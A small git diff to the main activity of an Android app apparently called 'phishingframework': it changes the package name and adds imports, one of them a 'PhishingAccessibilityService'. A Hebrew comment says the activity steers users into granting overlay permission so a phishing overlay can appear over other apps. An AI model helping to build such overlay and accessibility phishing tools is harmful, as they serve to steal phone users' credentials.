@@ -1,4 +1,4 @@
-package com.example.phishingframework
+package com.example.phishingframework.activities
 
 import android.content.ComponentName
 import android.content.Intent
@@ -10,6 +10,8 @@ import android.widget.Toast
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
+import com.example.phishingframework.R
+import com.example.phishingframework.services.PhishingAccessibilityService
 
 //זו ה־Activity הראשית של האפליקציה, שמשמשת לשגר את המשתמש להעניק הרשאות קריטיות לפעולת ה-framework:
 //הרשאת Overlay – כדי לאפשר הצגת ה־PhishingOverlayActivity מעל אפליקציות אחרות.
